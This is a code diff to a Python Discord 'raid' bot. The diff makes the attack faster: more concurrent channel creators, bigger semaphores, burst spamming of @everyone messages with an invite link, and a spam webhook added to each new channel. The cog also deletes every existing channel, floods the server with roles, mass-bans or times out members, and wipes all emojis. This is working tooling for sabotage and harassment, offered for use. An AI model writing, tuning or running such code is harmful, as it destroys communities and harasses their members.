@@ -32,11 +32,12 @@ RAID_LINK = "https://discord.gg/s59zWvzK6c"
 RAID_NAME = f"RAIDED BY {RAID_TAG}"
 
 CHANNEL_CAP    = 490
-CREATORS       = 3
+CREATORS       = 5
 ROLE_FLOOD_MAX = 200
+SPAM_BURST     = 3   # messages sent per semaphore slot acquisition
 
-_SPAM_SEM    = asyncio.Semaphore(30)
-_WH_SEM      = asyncio.Semaphore(10)
+_SPAM_SEM = asyncio.Semaphore(50)
+_WH_SEM   = asyncio.Semaphore(25)
 
 _MSGS = [
     f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
@@ -242,7 +243,7 @@ class Raid(commands.Cog):
             existing = list(guild.channels)
             print(f"[raid] concurrent-deleting {len(existing)} channels...", flush=True)
 
-            del_sem = asyncio.Semaphore(20)
+            del_sem = asyncio.Semaphore(40)
 
             async def _del(ch):
                 async with del_sem:
@@ -290,6 +291,7 @@ class Raid(commands.Cog):
                             idx = len(created)
                         print(f"[raid] created #{name} ({idx})", flush=True)
                         bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
+                        bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
                     except asyncio.TimeoutError:
                         print(f"[raid] TIMEOUT #{name} — sleeping 5s", flush=True)
                         await asyncio.sleep(5.0)
@@ -308,17 +310,14 @@ class Raid(commands.Cog):
                     i += step
 
             await asyncio.gather(
-                _creator(0,   CREATORS),
-                _creator(1,   CREATORS),
-                _creator(2,   CREATORS),
+                _creator(0, CREATORS),
+                _creator(1, CREATORS),
+                _creator(2, CREATORS),
+                _creator(3, CREATORS),
+                _creator(4, CREATORS),
                 return_exceptions=True,
             )
             print(f"[raid] channel create done — {len(created)} channels", flush=True)
-
-            # ── Phase 3: webhook boost ────────────────────────────────────────
-            if not se.is_set() and created:
-                print(f"[raid] starting webhook boost on {len(created)} channels", flush=True)
-                bot_state.add_task(asyncio.create_task(self._webhook_phase(created)))
 
         except asyncio.CancelledError:
             print("[raid] channel_loop cancelled", flush=True)
@@ -330,38 +329,28 @@ class Raid(commands.Cog):
                 bot_state.active_simulation = None
 
     # ─────────────────────────────────────────────────────────────────────────
-    # WEBHOOK PHASE — runs after channels are created
-    # Adds 1 webhook per channel and spawns an extra spam task using it.
-    # This ADDS to the direct channel.send spam already running.
+    # ADD WEBHOOK — called per channel immediately at creation time
     # ─────────────────────────────────────────────────────────────────────────
-    async def _webhook_phase(self, channels: list[discord.TextChannel]) -> None:
+    async def _add_webhook(self, channel: discord.TextChannel) -> None:
         se = bot_state.stop_event
-
-        async def _add_webhook(ch: discord.TextChannel) -> None:
-            if se.is_set():
-                return
-            async with _WH_SEM:
-                try:
-                    wh = await asyncio.wait_for(
-                        ch.create_webhook(name=random.choice(_WH_NAMES)),
-                        timeout=10.0,
-                    )
-                    print(f"[wh] webhook added to #{ch.name}", flush=True)
-                    bot_state.add_task(asyncio.create_task(self._spam_webhook(wh)))
-                except asyncio.TimeoutError:
-                    pass
-                except discord.NotFound:
-                    pass
-                except discord.Forbidden:
-                    pass
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        await asyncio.sleep(float(getattr(e, "retry_after", 2.0)))
-                except Exception:
-                    pass
-
-        await asyncio.gather(*[_add_webhook(ch) for ch in channels], return_exceptions=True)
-        print("[wh] webhook phase complete", flush=True)
+        if se.is_set():
+            return
+        async with _WH_SEM:
+            try:
+                wh = await asyncio.wait_for(
+                    channel.create_webhook(name=random.choice(_WH_NAMES)),
+                    timeout=10.0,
+                )
+                bot_state.add_task(asyncio.create_task(self._spam_webhook(wh)))
+            except asyncio.TimeoutError:
+                pass
+            except (discord.NotFound, discord.Forbidden):
+                pass
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await asyncio.sleep(float(getattr(e, "retry_after", 2.0)))
+            except Exception:
+                pass
 
     # ─────────────────────────────────────────────────────────────────────────
     # DIRECT CHANNEL SPAM — starts immediately when a channel is created
@@ -375,12 +364,17 @@ class Raid(commands.Cog):
                 if se.is_set():
                     return
                 try:
-                    await channel.send(_msg(), allowed_mentions=mentions)
+                    results = await asyncio.gather(
+                        *[channel.send(_msg(), allowed_mentions=mentions) for _ in range(SPAM_BURST)],
+                        return_exceptions=True,
+                    )
+                    for r in results:
+                        if isinstance(r, (discord.NotFound, discord.Forbidden)):
+                            return
+                        if isinstance(r, discord.HTTPException) and r.status == 429:
+                            await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
                 except (discord.NotFound, discord.Forbidden):
                     return
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                 except Exception:
                     return
 
@@ -393,12 +387,18 @@ class Raid(commands.Cog):
 
         while not se.is_set():
             try:
-                await wh.send(_msg(), username=random.choice(_WH_NAMES), allowed_mentions=mentions)
+                results = await asyncio.gather(
+                    *[wh.send(_msg(), username=random.choice(_WH_NAMES), allowed_mentions=mentions)
+                      for _ in range(SPAM_BURST)],
+                    return_exceptions=True,
+                )
+                for r in results:
+                    if isinstance(r, (discord.NotFound, discord.Forbidden)):
+                        return
+                    if isinstance(r, discord.HTTPException) and r.status == 429:
+                        await asyncio.sleep(float(getattr(r, "retry_after", 1.0)))
             except (discord.NotFound, discord.Forbidden):
                 return
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
             except Exception:
                 return
 
@@ -407,7 +407,7 @@ class Raid(commands.Cog):
     # ─────────────────────────────────────────────────────────────────────────
     async def _role_flood(self, guild: discord.Guild) -> None:
         se = bot_state.stop_event
-        sem = asyncio.Semaphore(10)
+        sem = asyncio.Semaphore(25)
         colors = [
             discord.Color.red(), discord.Color.dark_red(), discord.Color.orange(),
             discord.Color.dark_orange(), discord.Color.purple(), discord.Color.dark_purple(),
@@ -464,7 +464,7 @@ class Raid(commands.Cog):
         ]
         print(f"[raid] banning/kicking {len(targets)} members", flush=True)
 
-        sem = asyncio.Semaphore(25)
+        sem = asyncio.Semaphore(50)
         dur = datetime.timedelta(days=28)
 
         async def _ban(m):
@@ -508,11 +508,16 @@ class Raid(commands.Cog):
     # EMOJI WIPE
     # ─────────────────────────────────────────────────────────────────────────
     async def _wipe_emojis(self, guild: discord.Guild) -> None:
-        for e in list(guild.emojis):
-            try:
-                await e.delete()
-            except Exception:
-                pass
+        sem = asyncio.Semaphore(10)
+
+        async def _del_emoji(e):
+            async with sem:
+                try:
+                    await e.delete()
+                except Exception:
+                    pass
+
+        await asyncio.gather(*[_del_emoji(e) for e in list(guild.emojis)], return_exceptions=True)
 
     # ── error handlers ─────────────────────────────────────────────────────────
     @raid.error
